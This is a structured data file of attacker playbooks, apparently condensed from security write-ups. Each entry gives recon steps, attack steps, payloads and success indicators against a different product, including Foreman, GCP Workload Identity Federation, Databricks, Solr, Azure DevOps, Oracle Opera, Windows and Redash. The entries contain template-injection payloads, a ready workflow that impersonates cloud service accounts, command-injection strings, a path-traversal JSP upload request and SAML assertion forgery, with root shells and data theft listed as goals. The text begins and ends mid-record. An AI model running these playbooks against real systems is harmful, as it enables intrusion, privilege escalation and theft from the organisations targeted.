tools_recommended: Suspicious Package: To analyze macOS installer packages.
tar: To create malicious tar.gz archives.
netcat (nc) or socat: For reverse shell payloads.
macOS command-line tools: for scripting and payload creation.
success_indicators: A reverse shell connected to the attacker's machine with root privileges.
A new user account created with administrator/sudo privileges.
Arbitrary command execution as root confirmed via a command like `whoami` returning 'root'.
failure_indicators: The update mechanism does not trigger or fails to download the malicious archive.
The extracted files do not have execute permissions or are not executed by the updater.
The payload executes but does not achieve root privileges.
A 403 Forbidden response if the update server performs validation on downloaded files.

playbooks.impact: Attacker can gain arbitrary code execution with root privileges on the victim's macOS machine, leading to full system compromise. This includes access to all user data, installation of persistent backdoors, and manipulation of system settings.
playbooks.key_lesson: When analyzing macOS installers, pay close attention to LaunchDaemons and LaunchAgents, and investigate how applications handle updates, especially if they involve downloading external files, as these can be vectors for privilege escalation.

meta.title: When you're so bored, you start debugging someone else's code: bug hunting in a random Cloud-Native project

trigger_conditions.when_to_apply: When authenticated access to the Foreman application is available and the user can manage templates in the HOSTS > TEMPLATES section.
prerequisites: Authenticated access to the Foreman application.
applicability_signals: Presence of the 'HOSTS > TEMPLATES' section in the Foreman UI.
Ability to create and edit templates.
skip_if: The 'Safemode' feature is enabled and cannot be bypassed, preventing any code execution.
User lacks permissions to access or manage templates.

recon_steps: Step 1: Log in to the Foreman application as an authenticated user.
Step 2: Navigate to the 'HOSTS > TEMPLATES' section to confirm template management functionality.
attack_steps: Step 1: Create a new template or edit an existing one within the 'HOSTS > TEMPLATES' section.
Step 2: Switch between the 'Editor' and 'Preview' tabs to observe template rendering.
Step 3: Inject simple Ruby code snippets like '<%= text='test string'; puts text %>' into the template.
Step 4: Observe the output in the 'Preview' tab for successful execution.
Step 5: Attempt to execute OS commands like '<%= `id` %>' if initial Ruby code execution is successful.
Step 6: Test for RCE by attempting to execute system commands or complex Ruby code, being mindful of the 'Safemode' feature.
payloads_or_patterns: <%= text='test string'; puts text %>
<%= test={a:77, b:77}; puts test[:a]*test[:b] %>
<%= puts ENV.keys %>
tools_recommended: Burp Suite (as a proxy for observing requests, though not strictly necessary for this exploit)
Foreman application UI
success_indicators: Successful rendering of injected Ruby code output in the 'Preview' tab (e.g., '["test string"]', '[5929]').
Execution of OS commands and display of their output if Safemode is bypassed or not active for those specific commands.
failure_indicators: Receiving an error message like 'Safemode doesn't allow to access ...' indicates Safemode is blocking execution. Pivot to finding Safemode bypasses or alternative injection vectors.
No output or unexpected output in the 'Preview' tab suggests the payload is not being interpreted as intended or is being sanitized.

playbooks.impact: Remote Code Execution (RCE) via Server-Side Template Injection (SSTI), allowing an attacker to execute arbitrary Ruby code or OS commands on the server hosting Foreman.
playbooks.key_lesson: Always test template engines for Server-Side Template Injection (SSTI) vulnerabilities, especially when code execution is possible, and be aware of security mechanisms like Safemode that may require bypass techniques.

meta.title: Exploiting misconfigured Google Cloud Service Accounts from GitHub Actions

target_profile.technology: Google Cloud Platform (GCP) Workload Identity Federation with GitHub Actions
affected_components: Google Cloud IAM Service Accounts configured with OIDC providers
tech_stack_fingerprints: Presence of `workload_identity_provider` and `service_account` parameters in plain text within workflows

trigger_conditions.when_to_apply: When a public GitHub repository contains a GitHub Actions workflow that authenticates to GCP using Workload Identity Federation with `google-github-actions/auth@v0`, and the `workload_identity_provider` and `service_account` are exposed in plain text within the workflow file.
prerequisites: Attacker must be able to create their own GitHub repository.
The target GCP project must be using Workload Identity Federation with GitHub.
The vulnerable GitHub Actions workflow must be publicly accessible or exploitable by an attacker's own workflow.
applicability_signals: Workflow file (`.github/workflows/*.yml`) containing the `google-github-actions/auth@v0` action.
Presence of `workload_identity_provider` and `service_account` parameters with hardcoded values (not secrets).
Absence of explicit conditions in the OIDC provider configuration (inferred from lack of mention in IaC/documentation).
skip_if: All GCP authentication details are stored as GitHub Secrets.
The GitHub Actions workflow has strict conditions applied to the OIDC provider that limit impersonation.
The target GCP service account has minimal or no permissions.

recon_steps: Step 1: Search GitHub for repositories containing GitHub Actions workflows with the `google-github-actions/auth@v0` action. Use search queries like: `workload_identity_provider path:/.github/workflows`.

Step 2: Review the found workflow files for instances where `workload_identity_provider` and `service_account` are hardcoded in plain text. Prioritize repositories that also contain Infrastructure as Code (IaC) definitions for GCP resources, particularly Workload Identity Pools.

Step 3: Examine Terraform files for resources like `google_iam_workload_identity_pool` and `google_iam_workload_identity_pool_provider` to understand the OIDC configuration and identify any potential conditions that may have been missed or are improperly configured.
attack_steps: Step 1: Create a new public GitHub repository for the attacker.
Step 2: Create a GitHub Actions workflow file (e.g., `.github/workflows/exploit.yml`) in the attacker's repository.

Step 3: Copy the `Authenticate to Google Cloud` step from the vulnerable repository's workflow into the attacker's workflow, replacing the placeholders with the identified `workload_identity_provider` and `service_account` values.
Step 4: Ensure the attacker's workflow has the `id-token: write` permission enabled.
Step 5: Add steps to the attacker's workflow to configure and use the `gcloud` CLI (e.g., `google-github-actions/setup-gcloud@v1`).
Step 6: Execute commands using `gcloud` to enumerate resources accessible by the compromised service account (e.g., `gcloud projects list`, `gcloud storage ls`, `gcloud compute instances list`).
payloads_or_patterns:
```yaml
name: Assume GCP OIDC Service Account

on: workflow_dispatch:

jobs:
  test_auth:
    name: 'Test OIDC Auth'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - id: 'auth'
        name: 'Authenticate to Google Cloud'
        uses: 'google-github-actions/auth@v0'
        with:
          workload_identity_provider: '<your-identity-pool>'
          service_account: '<your-service-account>'
      
      - name: 'Set up gcloud'
        uses: 'google-github-actions/setup-gcloud@v1'

      - name: 'Get projects'
        run: 'gcloud projects list'
```
tools_recommended: GitHub search functionality
Burp Suite or similar for intercepting and analyzing requests if dynamic interactions are needed
Git CLI for managing attacker's repository
Google Cloud SDK (`gcloud` CLI)
success_indicators: The `gcloud projects list` command successfully returns a list of GCP projects.
Commands like `gcloud storage ls` or `gcloud compute instances list` return valid output, indicating access to GCP resources.
The GitHub Actions runner successfully authenticates and executes commands as the target Service Account.
failure_indicators: The `Authenticate to Google Cloud` step fails with an authentication error, indicating invalid `workload_identity_provider` or `service_account` values.
The `gcloud` commands return permission denied errors, suggesting the compromised service account has insufficient privileges.
Workflow logs show errors related to OIDC token exchange, potentially due to misconfiguration or conditions on the GCP side.

playbooks.impact: An attacker can impersonate the misconfigured Google Cloud Service Account, gaining access to all resources and permissions assigned to that service account. This can lead to data exfiltration, unauthorized resource modification or deletion, and further lateral movement within the GCP environment.
playbooks.key_lesson: When configuring Google Cloud Workload Identity Federation with GitHub Actions, always restrict the OIDC provider's conditions to only allow specific GitHub repository and branch combinations to prevent unauthorized impersonation by external parties.

meta.title: Securing Databricks cluster init scripts
meta.authors: Elia Florio, Florian Roth, Marius Bartholdy

affected_components: Databricks Cluster Init Scripts (legacy global init scripts, cluster-named init scripts, cluster-scoped init scripts stored on DBFS)

trigger_conditions.when_to_apply: This playbook is applicable when an authenticated user with low privileges can control or add init scripts to Databricks clusters within the same workspace and organization.
prerequisites: The target Databricks workspace must have legacy global init scripts enabled, or cluster init scripts configured on DBFS.
The attacker must possess valid authenticated credentials for the Databricks workspace.
applicability_signals: Databricks workspace with legacy global init script feature enabled (checked via UI toggle).
Presence of cluster init scripts stored on DBFS.
User role does not restrict init script management.
skip_if: Legacy global init scripts are disabled.
No cluster init scripts are configured on DBFS.
All init script operations are denied due to user permissions.

recon_steps: Step 1: Log in to the Databricks workspace with an authenticated, low-privileged user account.
Step 2: Navigate to the cluster configuration settings to identify available init script configurations and management options.
Step 3: Check the status of the 'legacy global init script' toggle in the workspace settings (AWS | Azure).
attack_steps: Step 1: If legacy global init scripts are enabled, attempt to add or modify a global init script payload with malicious commands (e.g., shell commands to gain elevated access).
Step 2: If cluster init scripts are stored on DBFS, attempt to upload or modify an existing init script on DBFS with malicious commands, then attach it to a cluster.
Step 3: Trigger cluster startup or restart to execute the malicious init script with elevated privileges.
Step 4: Observe the execution of commands and potential privilege escalation.
payloads_or_patterns:
# Example payload to demonstrate privilege escalation via a shell command
# This would be part of a script uploaded to DBFS or configured as a global init script
systemctl enable sshd || true
ufw allow ssh || true
# Add commands to gain further access or exfiltrate data
tools_recommended: Databricks UI: For managing cluster configurations and init scripts.
Databricks CLI/API: For programmatic interaction and script upload/management.
Burp Suite: To intercept and analyze HTTP requests related to cluster and script management.
success_indicators: Execution of arbitrary commands with elevated privileges on the cluster (e.g., root access).
Successful exfiltration of sensitive data from the cluster.
Ability to control or access other clusters within the same workspace.
SSH service becomes accessible or firewall rules are modified to allow unauthorized access.
failure_indicators: Init scripts are not executed upon cluster startup.
Error messages indicating script execution failure or permission denied.
No observable change in cluster privileges or access controls.
Response indicates the legacy global init script feature is disabled and no DBFS scripts are present; pivot to exploring other cluster configuration vulnerabilities.

playbooks.impact: An authenticated, low-privileged user can escalate their privileges to gain admin-level access to other clusters within the same Databricks workspace and organization. This could lead to unauthorized data access, modification, or deletion, as well as the compromise of the entire workspace.
playbooks.key_lesson: Always scrutinize the security of script execution features, especially those that run with elevated privileges, and verify that legacy or deprecated features are properly secured or deprecated.

meta.title: CVE-2023-28231: RCE In The Microsoft Windows DHCPv6 Service

trigger_conditions.when_to_apply: When the target is running a vulnerable version of the Microsoft Windows DHCPv6 Service and is exposed to network traffic.
prerequisites: Target must have the DHCPv6 Service enabled and running.
Attacker must be able to send network traffic to the target on UDP ports 547 or 546.
applicability_signals: DHCPv6 service is identified on the target system.
The target is reachable on UDP ports 547 or 546.
skip_if: DHCPv6 service is not running or is disabled.
Network firewall blocks UDP traffic on ports 547 and 546.

recon_steps: Step 1: Scan target network for open UDP ports 547 and 546 to identify potential DHCPv6 servers.
Step 2: Fingerprint the running services to confirm the presence of Microsoft DHCPv6 Server.
attack_steps: Step 1: Craft a malicious DHCPv6 Relay-forward message with more than 32 nested 'Relay Message' options.
Step 2: Send the crafted DHCPv6 Relay-forward message to the target's DHCPv6 server IP address on UDP port 547.
Step 3: Monitor for abnormal service behavior or crashes, indicating a potential buffer overflow.
Step 4: If a buffer overflow is confirmed, attempt to trigger arbitrary code execution by controlling the overflowed buffer.
payloads_or_patterns: A crafted DHCPv6 Relay-forward message with an excessive number of nested Relay Message options, exceeding the 32-hop limit. Specific shellcode would be required for RCE.
tools_recommended: Scapy: for crafting and sending custom DHCPv6 packets.
Wireshark: for analyzing DHCPv6 traffic and verifying packet structure.
success_indicators: Crash of the DHCPv6 service (svchost.exe process associated with DHCPv6).
Receipt of a reverse shell or execution of arbitrary commands on the target system.
failure_indicators: DHCPv6 service processes the crafted message without crashing or exhibiting errors (patch applied or not vulnerable).
Network filtering prevents the malicious packet from reaching the target.

playbooks.impact: Remote Code Execution (RCE) with administrative privileges on the target Windows system.
playbooks.key_lesson: When analyzing network services like DHCPv6, pay close attention to the parsing of complex message structures and nested options, as improper validation can lead to heap-based buffer overflows and RCE.

meta.title: AWS Identity Center (formerly known as AWS SSO): A Guide to Privilege Escalation and Identity and Access Management

affected_components: Console vs API Permissions for Group Membership
tech_stack_fingerprints: AWS Identity Center is configured and in use within an AWS Organization.
AWS Organizations is a prerequisite for AWS Identity Center.

trigger_conditions.when_to_apply: When an attacker has authenticated access to AWS Identity Center and can modify or influence permission sets, account assignments, or group memberships.
prerequisites: The target environment utilizes AWS Identity Center for managing access.
The attacker has authenticated credentials with sufficient privileges to modify Identity Center configurations (e.g., manage permission sets, assign users/groups to accounts).
applicability_signals: Existence of permission sets that can be modified.
Ability to assign users or groups to AWS accounts.
Ability to add or remove users from groups.
skip_if: The attacker has no authenticated access to AWS Identity Center.
The attacker's privileges are strictly read-only and do not allow for any modifications to permission sets, assignments, or group memberships.

recon_steps: Step 1: Identify existing permission sets within AWS Identity Center.
Step 2: Enumerate AWS accounts assigned to users or groups.
Step 3: List group memberships to understand user-to-group associations.
Step 4: Analyze IAM policies attached to permission sets to understand the scope of privileges granted.
attack_steps: Step 1: **Permission Set Modification:** Modify an existing permission set to grant broader permissions than intended. This could involve adding more permissive policies or changing the scope.
Step 2: **Adding Permissions:** If the attacker can add new permission sets or modify existing ones, they can grant themselves or a controlled user elevated privileges.
Step 3: **Scope Change via Account Assignment:** Reassign a user or group with existing, limited permissions to an AWS account that has more sensitive resources or configurations.

Step 4: **Membership Modification (User to Group Association):** If the attacker can manage group memberships, they can add a user to a group that has elevated privileges, thereby escalating the user's access.

Step 5: **Exploit Console vs API Permission Discrepancy:** If separate console and API permissions exist for group membership (e.g., `sso-directory:AddMemberToGroup` vs `identitystore:CreateGroupMembership`), attempt to use the permission with broader impact or exploit a potential difference in enforcement.
payloads_or_patterns: Modify `policyDocument` within a permission set to include `"*"` for actions or resources.
Assign a user to an AWS account previously only accessible by administrators.
Add a user to a privileged group, e.g., `aws sso-directory add-member-to-group --group-id <privileged_group_id> --member-id <attacker_user_id>`
tools_recommended: AWS CLI: For enumerating permission sets, accounts, groups, and modifying configurations.
AWS IAM Access Analyzer: To review permissions and identify overly permissive configurations.
success_indicators: The attacker gains access to AWS accounts or resources that were previously inaccessible.
The attacker can perform actions with elevated privileges (e.g., create or delete resources they shouldn't be able to).
CloudTrail logs show unexpected or unauthorized changes to permission sets, assignments, or group memberships initiated by the attacker.
failure_indicators: Attempts to modify permission sets or assignments are met with insufficient privilege errors (e.g., `AccessDenied`).
The attacker cannot find any existing permission sets or groups that they can leverage for escalation.
WAF or other security controls block the API calls to modify Identity Center configurations.

playbooks.impact: Privilege escalation within AWS accounts managed by AWS Identity Center. This can lead to unauthorized access to sensitive data, modification or deletion of resources, and potential compromise of the entire AWS environment.
playbooks.key_lesson: Always audit and restrict permissions associated with AWS Identity Center permission sets and account assignments, paying close attention to the separation between console and API actions for group management.

meta.title: Apache Solr 8.3.1 RCE from exposed administration interface

tech_stack_fingerprints: Solr version 8.3.1 in HTTP headers or HTML content

trigger_conditions.when_to_apply: This technique is applicable when an unauthenticated attacker discovers an exposed Apache Solr administration interface running version 8.3.1 or a similar vulnerable version, and the core creation functionality is accessible.
prerequisites: The target is running Apache Solr version 8.3.1 or a similarly vulnerable version.
The Solr administration interface is accessible externally.
applicability_signals: The presence of an Apache Solr administration panel (e.g., at `/solr/` or `/solr/admin/`).
Confirmation of Solr version 8.3.1.
Ability to access the core creation form without authentication.
skip_if: The Solr administration interface is not accessible or requires authentication.
The Solr version is known to be patched against the described vulnerabilities.
WAF blocks requests to the core creation endpoints.

recon_steps: Step 1: Scan for Solr administration panels on common paths (e.g., `/solr/`, `/solr/admin/`, `/`).
Step 2: If a Solr panel is found, check the version number displayed on the main page or in HTTP headers.
Step 3: Attempt to access core creation functionality without authentication to confirm accessibility.
attack_steps: Step 1: Navigate to the Solr administration interface.
Step 2: Access the core creation interface (e.g., `/solr/admin/cores?action=CREATE`).

Step 3: Create a new core, setting the `instanceDir` parameter to point to the Solr installation's `configsets` directory (e.g., `/path/to/solr/server/solr/configsets/basic_configset`). This leverages path traversal to create a core without uploading files.

Step 4: Once a core is created, leverage the file upload functionality within a core to upload a malicious file (e.g., a Velocity template or XSLT file). The writeup mentions temporary files being created (`.tmp`) when file size exceeds a threshold, indicating a potential upload mechanism. The exact exploit path for RCE via this upload requires further investigation based on Solr's processing of these uploaded files, potentially involving CVE-2019-17558 if Velocity is enabled, or other RCE vectors if arbitrary XSLT is processed.

Step 5: If RCE is not achieved directly via file upload, consider leveraging the ability to create directories anywhere on the disk (mentioned as a fallback if node creation fails) to prepare for other attack vectors.
payloads_or_patterns: Core creation request payload: `action=CREATE&name=<core_name>&instanceDir=/path/to/solr/server/solr/configsets/basic_configset` (replace `/path/to/solr/` with the actual Solr installation path, `<core_name>` with a unique name).
Potential malicious file upload (example for Velocity - requires further specific payload construction based on Solr's Velocity rendering): A Velocity template that executes OS commands.
Potential malicious XSLT file (requires further specific payload construction based on Solr's XSLT processing).
tools_recommended: Burp Suite: To intercept and modify HTTP requests for core creation and file uploads.
Nmap: For port scanning and service detection to find exposed Solr instances.
GoBuster/Dirb: For directory brute-forcing to discover Solr admin interfaces.
Custom scripts: To automate the creation of cores and file uploads.
success_indicators: Successful creation of a core using a crafted `instanceDir` pointing to `configsets`.
Confirmation of a temporary file (`.tmp`) being created in the Solr server's `tmp` directory after uploading a file exceeding a certain size threshold.
Execution of a command on the server (e.g., receiving a reverse shell, a specific output from an `id` command, or a beacon from a C2 server) after uploading a crafted malicious file.
failure_indicators: Core creation fails with an error indicating invalid `instanceDir` path (suggesting path traversal is blocked or the path is incorrect).
Uploaded files are not processed or do not lead to code execution, indicating the vulnerability requires a specific type of file or exploit chain.
403 Forbidden or other access denied errors when trying to access core creation or file upload endpoints.
A generic error page or no discernible change in behavior after attempting to exploit.

playbooks.impact: Remote Code Execution (RCE) on the Solr server, allowing an attacker to gain full control over the affected machine, steal sensitive data, disrupt services, or use the compromised server as a pivot point for further attacks.
playbooks.key_lesson: Always test path traversal vulnerabilities in file upload and configuration parameters of web applications, as they can bypass restrictions and lead to arbitrary file placement or code execution.

meta.title: Azure Devops CICD Pipelines - Command Injection With Parameters, Variables And A Discussion On Runner Hijacking

trigger_conditions.when_to_apply: This technique is applicable when an attacker has the ability to modify runtime parameter values for a pipeline that uses script-based tasks (inlinescript, script, AzureCLI).
prerequisites: Attacker must be able to edit runtime parameter values for a pipeline.
The pipeline must contain tasks that execute shell commands (e.g., `script`, `inlinescript`, `AzureCLI`).
applicability_signals: Pipeline definition includes `script`, `inlinescript`, or `AzureCLI` tasks.
Pipeline allows modification of runtime parameters by the user executing it.
skip_if: The target environment strictly sanitizes or disallows all special shell characters in pipeline parameters.
No script-based tasks are present in the pipeline.

recon_steps: Step 1: Identify pipelines where runtime parameters can be modified by the authenticated user.
Step 2: Examine the pipeline definition (YAML) to identify tasks that execute shell commands (`script`, `inlinescript`, `AzureCLI`).
Step 3: Analyze how user-controlled parameters or variables are passed into these script tasks.
attack_steps: Step 1: Craft a malicious payload that includes shell commands, designed to be injected into a user-controlled parameter or variable within a script task. The payload should be designed to bypass potential sanitization by the CI/CD system.

Step 2: Modify the pipeline's runtime parameters or variables to include the crafted malicious payload. This often involves injecting command separators (e.g., `;`, `&&`, `||`) and the desired shell commands.
Step 3: Trigger the pipeline execution.
Step 4: Observe the pipeline runner's behavior for signs of command execution. This might involve looking for unexpected network traffic, file creation/modification, or exfiltration of data.
Step 5: If the initial injection is blocked, attempt different encoding methods or alternative command injection techniques.
payloads_or_patterns: Example: For a parameter `TARGET_HOST` used in `echo $(TARGET_HOST)`, inject: `echo $(TARGET_HOST); id` to execute the `id` command.
Example: For a variable `FILE_CONTENT` used in `cat <(echo "$FILE_CONTENT")`, inject: `echo 'sensitive_data' > /tmp/pwned.txt && cat /tmp/pwned.txt`
tools_recommended: Burp Suite: To intercept and modify pipeline parameter values.
Custom scripts: For automating payload generation and pipeline triggering.
success_indicators: Pipeline runner executes injected commands (e.g., returning output of `id`, `whoami`, or creating a file).
Exfiltration of sensitive data (e.g., secrets, environment variables) from the runner to an attacker-controlled server.
Unexpected network connections initiated by the pipeline runner.
Successful runner hijacking, leading to unauthorized access to systems the runner can reach.
failure_indicators: Pipeline fails with an error message indicating invalid input or syntax in the parameter.
Injected commands are printed literally and not executed.
Response indicates sanitization or blocking of special characters.
No observable behavior change on the runner or in the environment.

playbooks.impact: The attacker can compromise the pipeline runner, gaining unauthorized access to sensitive information such as deployment secrets, Azure service principal credentials, and any systems the runner has access to. This can lead to full compromise of the deployment environments (dev, test, production).
playbooks.key_lesson: Always validate and sanitize user-supplied input that is incorporated into shell commands executed by CI/CD pipelines, especially when parameters or variables are directly embedded without proper escaping.

meta.title: Unauthorized access to the admin panel via leaked credentials on the WayBackMachine

trigger_conditions.when_to_apply: When a web application exposes an admin panel or sensitive directory that requires authentication, and the login form parameters (username/password) are visible in the URL.
prerequisites: Target has a login page with credentials passed as GET parameters.
Target's historical versions are accessible via the Wayback Machine or similar archives.
applicability_signals: Admin panel login page found.
Login credentials are submitted via GET parameters in the URL.
Existence of subdomains that might be out-of-scope but share source code with the in-scope target.
skip_if: Credentials are not passed as GET parameters.
No historical data for the target is found on the Wayback Machine.

recon_steps: Step 1: Identify target subdomains and perform directory fuzzing to find potential admin panels or sensitive directories.
Step 2: Analyze the identified paths and observe how authentication credentials are handled (e.g., GET parameters).
Step 3: Search for the target's historical versions on the Wayback Machine and relevant code repositories (GitHub) for leaked credentials or endpoints.
Step 4: If direct hits are not found, test out-of-scope domains that might share source code with the target, and check their archived paths on the Wayback Machine for leaked credentials.
attack_steps: Step 1: Identify leaked username/password pairs and specific endpoints from archived historical data found on the Wayback Machine.
Step 2: Construct the target URL using the in-scope domain, the identified sensitive path, and the leaked credentials as GET parameters.
Step 3: Attempt to access the admin panel by submitting the crafted URL.
payloads_or_patterns: <TARGET_URL>/<SENSITIVE_PATH>?username=<LEAKED_USERNAME>&password=<LEAKED_PASSWORD>
tools_recommended: Wayback Machine (web archive)
Google Dorks (for searching historical data and code repositories)
Sublist3r or Amass (for subdomain enumeration)
Dirb or Gobuster (for directory fuzzing)
Burp Suite (for request analysis and manipulation)
success_indicators: Successful login to the admin panel, indicated by a 200 OK HTTP status code and access to administrative functionalities.
Response page indicating successful authentication and access to restricted content.
failure_indicators: 401 Unauthorized or 403 Forbidden responses for all attempted credentials.
The login form does not accept GET parameters for credentials.
No historical data found on Wayback Machine.

playbooks.impact: Unauthorized access to the administrative panel, allowing the attacker to perform actions with elevated privileges, potentially leading to data breaches, system compromise, or further exploitation.
playbooks.key_lesson: Always search historical archives like the Wayback Machine for leaked credentials or sensitive information that might grant unauthorized access, especially for authentication endpoints.

meta.title: Exploiting an Order of Operations Bug to Achieve RCE in Oracle Opera

tech_stack_fingerprints: Oracle Opera landing page appearance (described as '90's legacy software', 'Geocities vibes')

trigger_conditions.when_to_apply: When a target is identified as running Oracle Opera and the /FileReceiver servlet is accessible. This technique leverages an order of operations bug in file handling.
prerequisites: Target system is running Oracle Opera software.
applicability_signals: Existence of the '/FileReceiver' servlet endpoint.
The servlet accepts parameters: 'filename', 'crc', 'append', 'jndiname', 'username'.
The 'jndiname' and 'username' parameters appear to be DES-encrypted.
skip_if: The /FileReceiver endpoint is not accessible or returns an error for all requests.
Input sanitization on 'jndiname' and 'username' prevents exploitation.

recon_steps: Step 1: Identify target system running Oracle Opera. Observe landing page for characteristic legacy UI elements.
Step 2: Probe for the '/FileReceiver' servlet endpoint to confirm its existence and accessibility.
Step 3: Analyze requests to '/FileReceiver' to understand accepted parameters and their potential encryption/sanitization.
attack_steps: Step 1: Craft a malicious file upload request to the '/FileReceiver' endpoint. The 'filename' parameter should contain a path traversal payload (e.g., '../../../../../../tmp/shell.jsp').

Step 2: The 'jndiname' and 'username' parameters should be crafted to exploit the order of operations bug, leading to the execution of code. The exact payload requires deeper understanding of the 'DES.decrypt' and 'SanitizeParameters.sanitizeServletParamOrUrlString' functions in relation to the order of operations.

Step 3: Upload a JSP payload disguised as a regular file. The exploit aims to place this JSP in a web-accessible directory (e.g., /tmp or a servlet path) by overwriting or manipulating existing files due to the order of operations flaw.
Step 4: After successful placement, attempt to access the uploaded JSP via a web request to achieve RCE.
payloads_or_patterns: filename=../../../../../../tmp/shell.jsp&jndiname=<DES_ENCRYPTED_MALICIOUS_JNDINAME>&username=<DES_ENCRYPTED_MALICIOUS_USERNAME>

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<% out.println("hello"); // Your RCE payload here %>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
tools_recommended: Burp Suite: To intercept, modify, and replay HTTP requests. Use repeater for manual testing and intruder for fuzzing parameters.
Java Decompiler (e.g., JD-GUI): To analyze the compiled Java classes (com.micros.opera.servlet.FileReceiver) and understand the DES decryption and sanitization logic.
success_indicators: HTTP response indicating successful file upload (e.g., 200 OK with a success message).
Receiving an HTTP response from the uploaded JSP payload when accessed directly (e.g., 'hello' output from the example JSP).
failure_indicators: 400 Bad Request or 403 Forbidden responses for crafted requests suggest input validation or WAF interference.
500 Internal Server Error might indicate an unhandled exception, requiring further analysis of the exploit payload and target server logs.

If the file is uploaded but not to an executable path or the JSP is not processed, the order of operations exploit is not fully achieved, requiring adjustment of the path traversal or decryption logic.

playbooks.impact: Remote Code Execution (RCE) on the Oracle Opera server, allowing an unauthenticated attacker to execute arbitrary commands with the privileges of the running application. This can lead to full system compromise, data exfiltration, and further attacks.
playbooks.key_lesson: Always investigate the order of operations in file upload functionalities, especially when parameters are encrypted or go through multiple sanitization steps, as subtle flaws can lead to arbitrary file placement and RCE.

meta.title: Privilege Escalation in Microsoft Windows

affected_components: Group Policy Updates (specifically Internet Explorer User Accelerators setting)

trigger_conditions.when_to_apply: When a low-privileged user account is present on a vulnerable Windows system where Group Policy updates for Internet Explorer are configured and processed.
prerequisites: The target system must be running a vulnerable version of Microsoft Windows.
Group Policy updates related to Internet Explorer (e.g., Internet Explorer User Accelerators) must be configured and pushed to the target machine.
applicability_signals: Existence of the directory C:\Users\<user>\AppData\Local\Microsoft\Internet Explorer\
The ability to create and delete files/symlinks within the user's AppData directory.
The presence of Group Policy processing on the system.
skip_if: The Group Policy settings for Internet Explorer are not enabled or configured.
The user lacks the necessary permissions to create symbolic links in the target directory.

recon_steps: Step 1: Identify the version of Microsoft Windows running on the target system. Check for specific build numbers mentioned in the advisory.
Step 2: Verify if Group Policy processing is active and if any Internet Explorer-related policies are being applied to the user context.
attack_steps: Step 1: Ensure the directory C:\Users\<user>\AppData\Local\Microsoft\Internet Explorer\ is accessible and potentially empty. If not empty, clean it using administrative privileges or by stopping relevant user-controlled processes (if possible).
Step 2: Use a tool like SharpLink (or equivalent) to create symbolic links within C:\Users\<user>\AppData\Local\Microsoft\Internet Explorer\.
Step 3: Link 'brndlog.txt' to a user-controlled file that contains the desired payload (e.g., a DLL for hijacking or a service executable for overwriting).
Step 4: Link 'brndlog.bak' to the arbitrary target location within the file system where the payload should be written.

Step 5: Trigger a Group Policy update that includes the affected Internet Explorer settings. This can often be achieved by running 'gpupdate /force' as a low-privileged user if policy refresh is allowed.
payloads_or_patterns: SharpLink tool for creating symbolic links.
Payload file (e.g., malicious DLL, service executable).
Target file path for the payload, determined by the privilege escalation technique chosen (e.g., DLL hijacking paths, service binary paths).
tools_recommended: SharpLink.cs (for creating symbolic links)
Process Explorer or similar tools (to identify and stop processes locking files in AppData\Local\Microsoft\Internet Explorer\CacheStorage, if necessary)
success_indicators: The creation of the user-controlled file at the arbitrary target location (e.g., C:\usd.txt in the PoC).
Successful execution of the payload (e.g., a DLL loaded by a privileged process, a service starting with elevated privileges).
failure_indicators: Symlink creation fails due to permissions.
Group Policy update does not trigger the copy operation.
The copied file is not what was intended or is corrupted.
Payload execution does not result in privilege escalation.

playbooks.impact: A low-privileged user can overwrite arbitrary files on the system, leading to privilege escalation by techniques such as DLL hijacking, overwriting service executables, or other file manipulation methods that can be leveraged by privileged processes.
playbooks.key_lesson: When Group Policy is used to manage application settings (like Internet Explorer), investigate how it handles file operations within user-controlled directories, as symbolic link vulnerabilities can allow for arbitrary file overwrites and privilege escalation.

meta.title: Redash SAML Authentication Bypass

trigger_conditions.when_to_apply: When Redash is configured to use SAML for authentication and the installed version of pysaml2 is vulnerable to CVE-2021-21239.
prerequisites: Redash instance is accessible.
Redash is configured with SAML as an authentication method.
applicability_signals: SAML login page is present.
Browser developer tools show requests to /saml/login or /saml/callback.
HTTP response headers do not indicate a patched version of pysaml2 (insufficient detail in writeup on how to check this).
skip_if: Redash is not using SAML.
WAF blocks crafted SAML requests.

recon_steps: Step 1: Navigate to the Redash login page and identify the SAML authentication option.
Step 2: Observe the SAML login flow in browser developer tools to identify the SAML Entity ID used by the IdP.
Step 3: Navigate to Settings -> Users to enumerate existing user accounts and identify potential administrator accounts.
Step 4: Observe the SAML Entity ID pattern used by common IdPs (e.g., Google: `https://accounts.google.com/o/saml2?idpid=<IDPID>`).
attack_steps: Step 1: Forge a SAML assertion XML message. Embed a target administrator's email address within the SAML assertion.
Step 2: Ensure the forged SAML assertion uses the correct SAML Entity ID obtained during recon.
Step 3: Send the forged SAML assertion as an unsolicited SAML response to the Redash `/saml/callback` endpoint.
Step 4: If successful, the attacker will be logged in as the targeted administrator.
payloads_or_patterns: Forge SAML assertion with crafted `<saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"><USER_ID/email@domain.com></saml:NameID></saml:Subject>` and target SAML Entity ID.
tools_recommended: Burp Suite: To intercept and modify SAML requests, forge SAML assertions.
Custom script (Python with `xmlsec` or similar libraries): To programmatically generate and sign forged SAML messages.
success_indicators: Successful login to the Redash instance with the privileges of the targeted administrator account.
Access to administrative settings or sensitive data visible on the dashboard.
failure_indicators: Error messages indicating invalid SAML response or authentication failure (e.g., 400 Bad Request, 401 Unauthorized). -> Suggest checking SAML Entity ID or target email address.
Redirection back to the login page without authentication. -> Suggest verifying the crafted SAML payload integrity and IdP configuration.

playbooks.impact: An unauthenticated attacker can bypass SAML authentication and gain the highest possible privileges on the Redash instance, allowing them to access sensitive data, modify configurations, and potentially execute arbitrary code if further vulnerabilities exist.
playbooks.key_lesson: Always ensure that SAML libraries are updated to patched versions to prevent signature verification bypasses like CVE-2021-21239.

meta.title: Microsoft Exchange Powershell Remoting Deserialization leading to RCE (CVE-2023-21707)

trigger_conditions.when_to_apply: This vulnerability applies when an authenticated user can interact with Microsoft Exchange's PowerShell Remoting endpoints, and the target system is vulnerable to insecure deserialization via BinaryFormatter when processing specific object types.
prerequisites: Authenticated access to the target Microsoft Exchange server.
applicability_signals: Presence of PowerShell Remoting endpoints accessible by authenticated users.
